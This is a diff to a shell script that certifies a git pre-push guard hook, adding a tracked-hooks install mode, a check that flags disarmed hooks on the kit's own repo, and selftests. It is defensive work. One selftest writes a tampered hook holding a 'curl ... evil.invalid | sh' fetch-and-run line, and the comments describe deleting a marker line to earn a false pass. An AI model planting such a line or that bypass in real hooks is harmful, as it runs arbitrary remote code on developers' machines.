@@ -13,6 +13,18 @@
 # is honest UNVERIFIED (exit 2), never a silent pass — matching verify.sh's three-state
 # contract (and the guard hook itself requires jq, so jq-absent means the guard can't run).
 #
+# TWO INSTALL MODES (HOOK-INSTALL-RECURS-PER-SLICE, 2026-08-12). The second rung can be installed two
+# ways, and this check certifies BOTH — neither is forced, and a fresh clone has neither:
+#   * INSTALLED-COPY mode (the original): a copy at the default hooks dir, refreshed by hand whenever
+#     `hooks/pre-push` moves. FRESH = the copy matches the tracked `HEAD:hooks/pre-push` blob.
+#   * TRACKED-HOOKS mode: `core.hooksPath` points at the tree's OWN tracked `hooks/` directory, so
+#     `hooks/pre-push` IS the live hook — one keystroke, no re-copy treadmill, no merge→re-copy gap.
+#     FRESH is REDEFINED here: the worktree file must match `HEAD:hooks/pre-push`, so a DIRTY
+#     working-tree hook (live code no PR diff shows) is this mode's stale face and REDs — in linked
+#     worktrees too, where the kit's own engineer fan-out builds. A `core.hooksPath` pointing anywhere
+#     ELSE stays D2's disclosed skip on an ADOPTER tree (husky/lefthook own their dir) but FAILs on a
+#     KIT-SOURCE tree, where it means the rung was disarmed.
+#
 # B3 — THE SECOND RUNG (docs/architecture/2026-08-05-b3-rung-certifier-design.md). The
 # `PreToolUse` guard above is the FIRST rung; the installed `.git/hooks/pre-push` git hook is the
 # SECOND, and until this slice this check was BLIND to it — a tree could print `guard-wired: OK`
@@ -180,6 +192,53 @@ _gw_hookspath_noop() {
   [ -n "$_hn_abs" ] && [ -n "$_hn_def" ] && [ "$_hn_abs" = "$_hn_def" ]
 }
 
+# _gw_hookspath_tracked <core.hooksPath value> <dir> -> 0 iff it names <dir>'s OWN tracked hooks/
+# directory — the checkout's <toplevel>/hooks, which is where the kit's `hooks/pre-push` lives.
+# Δ1 (HOOK-INSTALL-RECURS-PER-SLICE): that value is NOT a foreign redirect and must never take the D2
+# disclosed skip — it is the kit's TRACKED-HOOKS MODE, in which the tracked file IS the live hook and
+# the re-copy treadmill ends. Sibling of _gw_hookspath_noop above (same _gw_resolve physical compare,
+# same _gw_git containment); only the DIRECTORY it compares against differs: the noop predicate asks
+# "is this the default .git/hooks?", this one asks "is this the tree's own tracked hooks/?".
+# Resolution rule: git resolves a RELATIVE core.hooksPath against the TOP-LEVEL of the working tree
+# (measured on git 2.48.1: from a subdirectory, `git rev-parse --git-path hooks/pre-push` answers
+# `../hooks/pre-push`), so the relative arm below is toplevel-anchored, not cwd-anchored. In a LINKED
+# worktree --show-toplevel is that checkout's own root, which is exactly right: a linked worktree has
+# its own hooks/ and its own HEAD, so both sides of the freshness compare live in THAT checkout.
+_gw_hookspath_tracked() {
+  _ht_top=$(_gw_git -C "$2" rev-parse --show-toplevel 2>/dev/null) || return 1
+  [ -n "$_ht_top" ] || return 1
+  _ht_want=$(_gw_resolve "$_ht_top/hooks") || _ht_want=""
+  case "$1" in
+    /*) _ht_abs=$(_gw_resolve "$1") || _ht_abs="" ;;
+    *)  _ht_abs=$(_gw_resolve "$_ht_top/$1") || _ht_abs="" ;;
+  esac
+  [ -n "$_ht_abs" ] && [ -n "$_ht_want" ] && [ "$_ht_abs" = "$_ht_want" ]
+}
+
+# _gw_kitsource <dir> -> 0 iff <dir> carries a KIT-SOURCE marker: _gw_qualifies's markers MINUS the
+# adopter one (ENGINEERING-PRINCIPLES.md). Δ2 splits the foreign-redirect face by TREE KIND, and this
+# is the split key. On the kit's own repo a hooksPath pointing at neither the default nor the tracked
+# hooks/ dir means the rung was DISARMED — a FAIL. On an ADOPTER tree the same value is a husky /
+# lefthook user legitimately owning their hooks dir, and D2's disclosed skip stands verbatim: never
+# green, never red, not the kit's to judge. Both markers are `export-ignore`d (.gitattributes), so an
+# adopter who copied the whole export tree does NOT accidentally read as kit-source.
+_gw_kitsource() {
+  { [ -f "$1/docs/ROADMAP-KIT.md" ] || [ -f "$1/.github/workflows/golden-path.yml" ]; }
+}
+
+# _gw_head_matches <dir> <file> -> 0 = <file> is byte-identical to HEAD:hooks/pre-push · 1 = it DIFFERS
+# · 2 = the tracked blob could not be materialized (its own verdict at the call site — an unverifiable
+# compare is NEVER reported as a match). Extracted from the ladder's inline compare so tracked-hooks
+# mode can run it BEFORE the marker test (review round 1 BLOCKER) without duplicating the mktemp/show
+# dance. Reads the TRACKED blob at HEAD, never the working-tree file, and goes through _gw_git so the
+# env-reroute containment (SEC HIGH-1) covers it like every other git call in this leg.
+_gw_head_matches() {
+  _hm_t=$(mktemp 2>/dev/null) || return 2
+  if ! _gw_git -C "$1" show "HEAD:hooks/pre-push" > "$_hm_t" 2>/dev/null; then rm -f "$_hm_t"; return 2; fi
+  if cmp -s "$_hm_t" "$2" 2>/dev/null; then rm -f "$_hm_t"; return 0; fi
+  rm -f "$_hm_t"; return 1
+}
+
 check_dir() {
   dir="$1"
   mode="${2:-full}"
@@ -284,6 +343,13 @@ check_dir() {
         if _gw_is_linked "$dir"; then _gw_linked=1; else _gw_linked=0; fi
         _gw_redirect_done=0
         _gw_redirect_note=""
+        # Δ1: which INSTALL MODE this tree runs. `installed` = the copy at the default hooks dir (the
+        # original, unchanged ladder). `tracked` = core.hooksPath names the tree's own tracked hooks/,
+        # so hooks/pre-push IS the live hook. The ladder below is SHARED — `git rev-parse --git-path
+        # hooks/pre-push` already respects the setting (measured), so it walks the right file either
+        # way and its byte compare against HEAD:hooks/pre-push is the freshness BOTH modes need. Only
+        # the wording, the remedies and the two linked-worktree branches are mode-aware.
+        _gw_mode=installed
         if [ -n "$_gw_hp" ] && ! _gw_hookspath_noop "$_gw_hp" "$dir"; then
           # core.hooksPath looks like a genuine redirect elsewhere — a husky/lefthook adopter may
           # own that dir; the kit neither installs into it nor passes judgment on what's there (D2).
@@ -293,6 +359,12 @@ check_dir() {
             # than a judgment further down.
             echo "N/A: pre-push rung — core.hooksPath contains a CONTROL CHARACTER; refusing to print it"
             _gw_redirect_done=1
+          elif _gw_hookspath_tracked "$_gw_hp" "$dir"; then
+            # Δ1 — TRACKED-HOOKS MODE, checked BEFORE both branches below on purpose: for the tree's
+            # own hooks/ dir the REV H1 premise ("a RELATIVE value in a linked worktree resolves to
+            # nothing here") is FALSE — a linked checkout has its own hooks/ — and the D2
+            # foreign-redirect skip is false too. Fall through to the ladder with no note.
+            _gw_mode=tracked
           else
             case "$_gw_hp" in /*) _gw_hp_relative=0 ;; *) _gw_hp_relative=1 ;; esac
             if [ "$_gw_linked" -eq 1 ] && [ "$_gw_hp_relative" -eq 1 ]; then
@@ -302,6 +374,21 @@ check_dir() {
               # through to the ladder (which already reflects hooksPath via --git-path) instead of
               # the redirect N/A; the ladder's own FAIL below names this redirect as the cause.
               _gw_redirect_note=" (core.hooksPath='$_gw_hp' is RELATIVE in a linked worktree — it resolves to nothing here, disabling hooks)"
+            elif _gw_kitsource "$dir"; then
+              # Δ2 — the disarm face, KIT-SOURCE trees only. Here the redirect is not a husky adopter
+              # owning their hooks dir; it is the kit's own rung pointed away from both the default
+              # dir and the tracked hooks/ dir, i.e. disarmed. The remedy names the SCOPE that
+              # actually carries the value: a `--unset` in the repo cures nothing when the value is
+              # the maintainer's GLOBAL one (and _gw_git deliberately does NOT strip HOME, because
+              # git honors that same global config at push time — so this leg sees what a push sees).
+              _gw_hp_local=$(_gw_git -C "$dir" config --local --get core.hooksPath 2>/dev/null) || _gw_hp_local=""
+              if [ -n "$_gw_hp_local" ]; then
+                _gw_disarm_cure="unset it in this repo, or point it at the tracked dir (the kit's own install: core.hooksPath = hooks)"
+              else
+                _gw_disarm_cure="the value is NOT in this repo's local config — it comes from your GLOBAL/system git config, so a repo-local unset cures nothing; fix it with a --global unset (or override it repo-locally by pointing core.hooksPath at hooks)"
+              fi
+              printf '%s\n' "FAIL: pre-push rung — kit-source tree with core.hooksPath='$_gw_hp': hooks are redirected away from BOTH the default dir and the tracked hooks/ dir, so the push rung is DISARMED on the kit's own repo (remedy: $_gw_disarm_cure)"; fail2=1
+              _gw_redirect_done=1
             else
               printf '%s\n' "N/A: pre-push rung — core.hooksPath redirects hooks to '$_gw_hp'; the kit does not judge another tool's hooks dir (disclosed skip; never green, never red)"
               _gw_redirect_done=1
@@ -312,7 +399,14 @@ check_dir() {
           if _gw_hostile "$_gw_hook"; then
             echo "FAIL: pre-push rung — the resolved hook path contains a CONTROL CHARACTER; refusing to print it"; fail2=1
           else
-            _gw_remedy="see docs/adoption/brownfield.md §5 for the human-run install/refresh command (never re-run incept)"
+            # Δ1: the remedy is mode-aware. In tracked-hooks mode a `cp` remedy is nonsense — there is
+            # nothing to copy TO; the live hook is the tracked file itself, so the cure is to restore
+            # or commit it.
+            if [ "$_gw_mode" = tracked ]; then
+              _gw_remedy="tracked-hooks mode: hooks/pre-push in THIS checkout IS the live hook — commit it, or restore it with 'git restore -- hooks/pre-push'; never a cp (see docs/adoption/brownfield.md §2 step 5)"
+            else
+              _gw_remedy="see docs/adoption/brownfield.md §2 step 5 for the human-run install/refresh command (never re-run incept)"
+            fi
             if [ -h "$_gw_hook" ] && [ ! -e "$_gw_hook" ]; then
               printf '%s\n' "FAIL: pre-push rung — $_gw_hook is a DANGLING SYMLINK (remedy: rm it — a cp here would write through the link; $_gw_remedy)"; fail2=1
             elif [ ! -f "$_gw_hook" ]; then
@@ -321,9 +415,46 @@ check_dir() {
               printf '%s\n' "FAIL: pre-push rung — $_gw_hook present but UNREADABLE — cannot verify it ($_gw_remedy)"; fail2=1
             elif [ ! -x "$_gw_hook" ]; then
               printf '%s\n' "FAIL: pre-push rung — $_gw_hook present but NOT EXECUTABLE — git silently ignores it on push ($_gw_remedy)"; fail2=1
+            elif [ "$_gw_mode" = tracked ]; then
+              # ── TRACKED-HOOKS MODE takes its own tail, in COMPARE-FIRST order (review round 1
+              # BLOCKER, both seats; security measured the composed exploit end to end). The shared
+              # chain below tests the KIT_GUARD_CORE marker BEFORE the byte compare, and in this mode
+              # that short-circuit was a false green: deleting the marker line from the live worktree
+              # hook — exactly what the disclosed cd-basename write (GUARD-BASENAME-AFTER-CD-BYPASS)
+              # produces — bought a "foreign hook preserved" PASS on a hook whose body is arbitrary
+              # code at push time. Here the compare runs first and a divergence from HEAD is judged
+              # marker or no marker, while a file that MATCHES HEAD and carries no marker still takes
+              # the foreign-preserve PASS (the adopter whose own tracked hook legitimately is not the
+              # kit's — asserted as a false-positive lock).
+              # The order is deliberately NOT changed for INSTALLED-copy mode below: there the compared
+              # file is a COPY that may legitimately be another tool's hook entirely, so marker-first
+              # is what keeps a foreign installed hook unjudged (§4.3 brownfield safety, rung_foreign).
+              if ! _gw_git -C "$dir" cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
+                printf '%s\n' "FAIL: pre-push rung — tracked hooks/pre-push missing from HEAD, so the live hook cannot be compared against anything this tree carries ($_gw_remedy)"; fail2=1
+              else
+                _gw_hm_rc=0
+                _gw_head_matches "$dir" "$_gw_hook" || _gw_hm_rc=$?
+                if [ "$_gw_hm_rc" -eq 2 ]; then
+                  printf '%s\n' "FAIL: pre-push rung — could not materialize tracked hooks/pre-push from HEAD to compare the live hook against ($_gw_remedy)"; fail2=1
+                elif [ "$_gw_hm_rc" -eq 1 ]; then
+                  printf '%s\n' "FAIL: pre-push rung — $_gw_hook is MODIFIED in the working tree — the LIVE hook does not match tracked HEAD:hooks/pre-push byte-for-byte, so the code git runs on push is not the code this tree carries ($_gw_remedy)"; fail2=1
+                elif ! grep -q 'KIT_GUARD_CORE' "$_gw_hook" 2>/dev/null; then
+                  echo "PASS: pre-push rung — foreign hook preserved (no KIT_GUARD_CORE marker, and it matches HEAD byte-for-byte); brownfield-safe, not the kit's to judge"
+                elif [ ! -r "$dir/.claude/hooks/guard-core.sh" ]; then
+                  printf '%s\n' "FAIL: pre-push rung — the live tracked hook matches HEAD but its core target $dir/.claude/hooks/guard-core.sh is missing/unreadable — not core-resolvable (D3; $_gw_remedy)"; fail2=1
+                else
+                  printf '%s\n' "PASS: pre-push rung — tracked-hooks mode (core.hooksPath='$_gw_hp'): the live hook IS the tracked hooks/pre-push, executable, worktree matches HEAD byte-for-byte, core-resolvable"
+                fi
+              fi
             elif ! grep -q 'KIT_GUARD_CORE' "$_gw_hook" 2>/dev/null; then
               echo "PASS: pre-push rung — foreign hook preserved (no KIT_GUARD_CORE marker); brownfield-safe, not the kit's to judge"
             elif [ "$_gw_linked" -eq 1 ]; then
+              # Δ1 (why this branch is INSTALLED-mode-only): the Δ6 freshness-N/A rationale below holds
+              # only where the two compare sides genuinely live in different checkouts — a shared
+              # installed hook vs this checkout's own tracked copy. In TRACKED-HOOKS mode both sides
+              # live in THIS checkout (its own hooks/pre-push, its own HEAD), so the compare is exact
+              # and N/A-ing it would blind the very surface the kit's engineer fan-out builds on. That
+              # mode never reaches here: it took its own compare-first tail above.
               echo "PASS: pre-push rung — installed, executable, marked (kit's)"
               echo "N/A: pre-push rung freshness — linked worktree/submodule; --git-path resolves the SHARED installed hook while hooks/pre-push is this checkout's own tracked copy, so a byte compare here would be spurious (Δ6, disclosed)"
             elif ! _gw_git -C "$dir" cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
@@ -339,6 +470,7 @@ check_dir() {
                 printf '%s\n' "FAIL: pre-push rung — could not materialize tracked hooks/pre-push from HEAD ($_gw_remedy)"; fail2=1
                 rm -f "$_gw_tracked"
               elif ! cmp -s "$_gw_tracked" "$_gw_hook" 2>/dev/null; then
+                # INSTALLED-copy mode only (tracked mode took its own tail above): an out-of-date COPY.
                 printf '%s\n' "FAIL: pre-push rung — $_gw_hook carries the kit marker but is STALE — it does not match tracked HEAD:hooks/pre-push byte-for-byte ($_gw_remedy)"; fail2=1
                 rm -f "$_gw_tracked"
               else
@@ -374,7 +506,7 @@ check_dir() {
   if [ "$mode" = "rung1only" ]; then
     echo "guard-wired: OK (--rung1-only: PreToolUse guard hook registered, matcher admits mutating tools, hook present; the second rung was NOT evaluated in this mode)"
   else
-    echo "guard-wired: OK (PreToolUse guard hook registered, matcher admits mutating tools, hook present; the push-rung leg above certifies the SECOND rung — present/executable/core-resolvable/FRESH, or a preserved foreign hook (uncertified), or a disclosed N/A — no longer blind to it)"
+    echo "guard-wired: OK (PreToolUse guard hook registered, matcher admits mutating tools, hook present; the push-rung leg above certifies the SECOND rung in EITHER install mode — an installed copy or tracked-hooks mode (core.hooksPath -> the tree's own hooks/) — present/executable/core-resolvable/FRESH, or a preserved foreign hook (uncertified), or a disclosed N/A — no longer blind to it)"
   fi
   return 0
 }
@@ -587,8 +719,11 @@ selftest() {
   d="$base/rung_hookspath"; mk_repo "$d" "$MATCHER" >/dev/null
   git -C "$d" config core.hooksPath .husky
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "core.hooksPath redirects hooks to '.husky'"; then
-    echo "selftest PASS: rung hooksPath='.husky' (main worktree) -> disclosed-skip N/A"
+  # Δ2 FALSE-POSITIVE LOCK: this fixture is an ADOPTER tree (mk_repo stamps only the adopter marker),
+  # so the SAME value that REDs as DISARMED on a kit-source tree below must still take D2's disclosed
+  # skip here, verbatim — the kit does not judge a husky/lefthook adopter's own hooks dir.
+  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "core.hooksPath redirects hooks to '.husky'" && ! printf '%s' "$out" | grep -q 'DISARMED'; then
+    echo "selftest PASS: rung hooksPath='.husky' (adopter main worktree) -> disclosed-skip N/A, never DISARMED"
   else echo "selftest FAIL: rung hooksPath='.husky' should disclosed-skip N/A (rc=$rc): $out"; st=1; fi
 
   # linked-worktree + RELATIVE core.hooksPath -> dangling redirect, named as the cause (review
@@ -606,6 +741,135 @@ selftest() {
     fi
   else
     echo "selftest FAIL: could not construct the linked-worktree + hooksPath fixture"; st=1
+  fi
+
+  # ── TRACKED-HOOKS MODE (HOOK-INSTALL-RECURS-PER-SLICE, Δ1/Δ2) ──────────────────────────────────
+  # mk_tracked <dir>: an mk_repo fixture switched to TRACKED-HOOKS mode — the tracked hooks/pre-push
+  # carries the exec bit IN THE INDEX (so a linked worktree checks it out executable), the redundant
+  # INSTALLED copy is REMOVED (this mode's green must come from the tracked file alone, never from a
+  # leftover .git/hooks copy), and core.hooksPath names the tree's own hooks dir. The config is set
+  # INSIDE this script's own process — the agent's shell never utters that key, which the guard
+  # human-gates (design §4, fixture mechanics).
+  # <kind> (2nd arg): `foreign` commits a MARKERLESS hook as the tree's own tracked hook (the adopter
+  # whose hooks/ is legitimately not the kit's); anything else keeps the kit-marked one.
+  mk_tracked() {
+    _td="$1"; mk_repo "$_td" "$MATCHER" >/dev/null
+    [ "${2:-kit}" != foreign ] || printf '#!/bin/sh\necho legacy hook\n' > "$_td/hooks/pre-push"
+    chmod +x "$_td/hooks/pre-push"
+    git -C "$_td" add -A >/dev/null 2>&1 || true
+    git -C "$_td" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "exec bit" >/dev/null 2>&1 || true
+    rm -f "$_td/.git/hooks/pre-push"
+    git -C "$_td" config core.hooksPath hooks
+  }
+
+  # tracked-mode PASS: core.hooksPath resolving to the tree's OWN tracked hooks/ dir is NOT a foreign
+  # redirect — it is the kit's tracked-hooks mode, where hooks/pre-push IS the live hook and the
+  # ladder's byte compare against HEAD becomes the worktree-vs-HEAD freshness.
+  d="$base/rung_tracked_ok"; mk_tracked "$d"
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'tracked-hooks mode' && printf '%s' "$out" | grep -q 'worktree matches HEAD'; then
+    echo "selftest PASS: tracked-hooks mode (clean, no installed copy) -> wired, mode named"
+  else echo "selftest FAIL: tracked-hooks mode should PASS naming the mode (rc=$rc): $out"; st=1; fi
+
+  # DIRTY-hook RED — this mode's redefined stale face and its load-bearing negative: the live hook is
+  # the WORKING-TREE file, so a working-tree mutation is arbitrary code at push time that no PR diff
+  # shows. It still carries the marker (marker-vacuity kill, as the installed mode's STALE leg), and
+  # the remedy must be restore/commit — a `cp` remedy would be nonsense here.
+  d="$base/rung_tracked_dirty"; mk_tracked "$d"
+  printf '#!/bin/sh\n# KIT_GUARD_CORE\necho tampered\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree' && printf '%s' "$out" | grep -q 'git restore'; then
+    echo "selftest PASS: tracked-hooks mode + dirty worktree hook -> FAIL (restore/commit remedy)"
+  else echo "selftest FAIL: tracked-hooks dirty hook should FAIL with a restore/commit remedy (rc=$rc): $out"; st=1; fi
+
+  # MARKERLESS-TAMPER RED (review round 1 BLOCKER, both seats; security measured the composed exploit
+  # end to end). The marker test used to SHORT-CIRCUIT ahead of the byte compare, so a worktree hook
+  # whose KIT_GUARD_CORE line was DELETED took the "foreign hook preserved" PASS — rc 0 on a live hook
+  # whose body is arbitrary code. That is not a hypothetical shape: the disclosed cd-basename write
+  # (GUARD-BASENAME-AFTER-CD-BYPASS) produces exactly a markerless file. In tracked mode the compare
+  # must run FIRST: a tracked file that differs from HEAD is judged, marker or no marker. The payload
+  # here is inert by construction (.invalid is RFC 2606 reserved) and shaped like the real thing.
+  d="$base/rung_tracked_markerless"; mk_tracked "$d"
+  printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree' && ! printf '%s' "$out" | grep -q 'foreign hook preserved'; then
+    echo "selftest PASS: tracked-hooks mode + MARKERLESS tampered hook -> FAIL (compare precedes the marker test)"
+  else echo "selftest FAIL: tracked-hooks markerless tamper must FAIL, never 'foreign preserved' (rc=$rc): $out"; st=1; fi
+
+  # FALSE-POSITIVE LOCK for that fix, and the reason the cure is PRECEDENCE rather than a marker
+  # requirement: an adopter whose OWN tracked hooks/pre-push carries no kit marker and is UNMODIFIED
+  # still takes the foreign-preserve PASS. Judging by "no marker => FAIL" would punish that repo; the
+  # compare-first order judges only what actually diverges from what the tree carries under review.
+  d="$base/rung_tracked_foreign"; mk_tracked "$d" foreign
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'foreign hook preserved'; then
+    echo "selftest PASS: tracked-hooks mode + markerless hook MATCHING HEAD -> foreign-preserve PASS (adopter unpunished)"
+  else echo "selftest FAIL: an unmodified markerless tracked hook should be preserved, not judged (rc=$rc): $out"; st=1; fi
+
+  # core-missing RED, TRACKED-MODE arm (review round 2 m3): the compare-first tail's core-resolvable
+  # leg had no fixture. The live tracked hook MATCHES HEAD and carries the marker, but the D3 core
+  # target is gone — mirror of installed mode's rung_coremissing, on the tracked ladder.
+  d="$base/rung_tracked_coremissing"; mk_tracked "$d"; rm -f "$d/.claude/hooks/guard-core.sh"
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not core-resolvable'; then
+    echo "selftest PASS: tracked-hooks mode, hook matches HEAD but core target missing -> FAIL (not core-resolvable)"
+  else echo "selftest FAIL: tracked-hooks core-missing should FAIL not core-resolvable (rc=$rc): $out"; st=1; fi
+
+  # HEAD-missing RED, TRACKED-MODE arm (review round 2 m3, the compare-first tail's :433 branch): the
+  # live tracked hook exists but HEAD carries no hooks/pre-push blob (it was committed then unstaged),
+  # so it cannot be compared against anything this tree carries. This is the state inception-done's
+  # (b8) mirrors — both surfaces RED it when HEAD exists but the hook is not committed.
+  d="$base/rung_tracked_headmissing"; mk_tracked "$d"
+  git -C "$d" rm --cached -q hooks/pre-push >/dev/null 2>&1
+  git -C "$d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "drop tracked hook" >/dev/null 2>&1
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'missing from HEAD'; then
+    echo "selftest PASS: tracked-hooks mode, hook not committed at HEAD -> FAIL (missing from HEAD)"
+  else echo "selftest FAIL: tracked-hooks HEAD-missing should FAIL missing from HEAD (rc=$rc): $out"; st=1; fi
+
+  # Δ2 DISARM RED — a KIT-SOURCE tree whose hooksPath points at neither the tracked dir nor the
+  # default has had its rung disarmed; on the kit's own repo that is a FAIL, not a disclosed skip.
+  d="$base/rung_kit_disarm"; mk_repo "$d" "$MATCHER" >/dev/null
+  mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
+  git -C "$d" config core.hooksPath .husky
+  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DISARMED'; then
+    echo "selftest PASS: kit-source tree + foreign hooksPath -> FAIL (rung DISARMED)"
+  else echo "selftest FAIL: kit-source tree + foreign hooksPath should FAIL as DISARMED (rc=$rc): $out"; st=1; fi
+
+  # Δ2 GLOBAL-config remedy: the same disarm, but the value is NOT in the repo's local config — it
+  # comes from the maintainer's GLOBAL config (HOME is deliberately NOT stripped by _gw_git, since
+  # git honors it at push time too, so this leg also LOCKS that deliberate non-stripping). A local
+  # `--unset` would not cure it, so the remedy must name the global config.
+  d="$base/rung_kit_globaldisarm"; mk_repo "$d" "$MATCHER" >/dev/null
+  mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
+  gh_home="$base/rung_kit_globalhome"; mkdir -p "$gh_home"
+  printf '[core]\n\thooksPath = %s\n' "$base/nowhere-hooks" > "$gh_home/.gitconfig"
+  if out=$(CI='' GITHUB_ACTIONS='' HOME="$gh_home" XDG_CONFIG_HOME="$gh_home/.config" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DISARMED' && printf '%s' "$out" | grep -q -- '--global'; then
+    echo "selftest PASS: kit-source tree + GLOBAL hooksPath -> FAIL naming the global-config cure"
+  else echo "selftest FAIL: kit-source + global hooksPath should FAIL naming the global cure (rc=$rc): $out"; st=1; fi
+
+  # LINKED WORKTREE in tracked mode — the fan-out surface (the kit's own engineer seats build there),
+  # and the face BOTH pre-existing linked-worktree branches got wrong for this mode: the REV H1
+  # "relative hooksPath resolves to nothing here" premise is FALSE (a linked checkout HAS its own
+  # hooks/), and the Δ6 freshness-N/A rationale ("the compare sides live in different checkouts") is
+  # false too — both sides live in THIS checkout. So the clean case must PASS and the dirty case must
+  # RED, never N/A.
+  d="$base/rung_tracked_wt_main"; mk_tracked "$d"
+  wt="$base/rung_tracked_wt_linked"
+  if git -C "$d" worktree add -q "$wt" -b rung-tracked-wt >/dev/null 2>&1; then
+    if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
+    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'tracked-hooks mode'; then
+      echo "selftest PASS: linked worktree in tracked-hooks mode (clean) -> wired, mode named"
+    else echo "selftest FAIL: linked worktree in tracked-hooks mode should PASS (rc=$rc): $out"; st=1; fi
+    printf '#!/bin/sh\n# KIT_GUARD_CORE\necho tampered\n' > "$wt/hooks/pre-push"; chmod +x "$wt/hooks/pre-push"
+    if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
+    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree'; then
+      echo "selftest PASS: linked worktree in tracked-hooks mode + dirty hook -> FAIL (no freshness N/A)"
+    else echo "selftest FAIL: linked worktree dirty hook should FAIL, not N/A (rc=$rc): $out"; st=1; fi
+  else
+    echo "selftest FAIL: could not construct the linked-worktree tracked-hooks fixture"; st=1
   fi
 
   # --separate-git-dir MAIN worktree (review round 1, item 3, SEC M2): git-dir == git-common-dir
@@ -652,7 +916,7 @@ selftest() {
   else echo "selftest FAIL: --rung1-only on a hookless qualifying tree should exit 0 (rc=$rc): $out"; st=1; fi
 
   if [ "$st" -ne 0 ]; then echo "guard-wired --selftest: FAIL" >&2; return 1; fi
-  echo "guard-wired --selftest: OK (full/wildcard wired; no-mcp/degenerate/Read-only/partial/missing fail; rung fresh/foreign wired, absent/stale/non-exec/dangling/core-missing/tracked-missing FAIL, no-git/CI=1/unqualifying/hooksPath-genuine N/A, linked-worktree+relative-hooksPath and --separate-git-dir and GIT_DIR-reroute and hostile-\$dir all correctly resolved, --rung1-only skips rung 2; fixtures left in $base)"
+  echo "guard-wired --selftest: OK (full/wildcard wired; no-mcp/degenerate/Read-only/partial/missing fail; rung fresh/foreign wired, absent/stale/non-exec/dangling/core-missing/tracked-missing FAIL, no-git/CI=1/unqualifying/hooksPath-genuine N/A, linked-worktree+relative-hooksPath and --separate-git-dir and GIT_DIR-reroute and hostile-\$dir all correctly resolved, --rung1-only skips rung 2; tracked-hooks mode wired clean (main + linked worktree) and RED when the worktree hook is MODIFIED, kit-source disarm RED (local + global scope) while the adopter D2 skip holds; fixtures left in $base)"
   return 0
 }
 
